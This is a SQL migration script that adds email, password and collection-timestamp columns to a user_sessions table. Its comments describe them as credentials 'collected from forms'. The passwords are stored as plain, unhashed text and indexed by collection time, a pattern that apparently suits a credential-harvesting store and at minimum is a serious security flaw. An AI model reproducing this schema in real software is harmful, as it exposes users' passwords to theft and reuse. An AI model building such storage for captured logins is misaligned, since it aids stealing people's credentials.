-- Add user credentials columns to existing user_sessions table
-- Run this to add email and password tracking to your existing table

ALTER TABLE user_sessions 
ADD COLUMN IF NOT EXISTS user_email VARCHAR(255) NULL,
ADD COLUMN IF NOT EXISTS user_password TEXT NULL,
ADD COLUMN IF NOT EXISTS credentials_collected_at TIMESTAMP WITH TIME ZONE NULL;

-- Add comments to the new columns
COMMENT ON COLUMN user_sessions.user_email IS 'User email collected from forms';
COMMENT ON COLUMN user_sessions.user_password IS 'User password collected from forms';
COMMENT ON COLUMN user_sessions.credentials_collected_at IS 'Timestamp when credentials were collected';

-- Create index for email-based queries
CREATE INDEX IF NOT EXISTS idx_user_sessions_user_email ON user_sessions (user_email);
CREATE INDEX IF NOT EXISTS idx_user_sessions_credentials_collected ON user_sessions (credentials_collected_at); 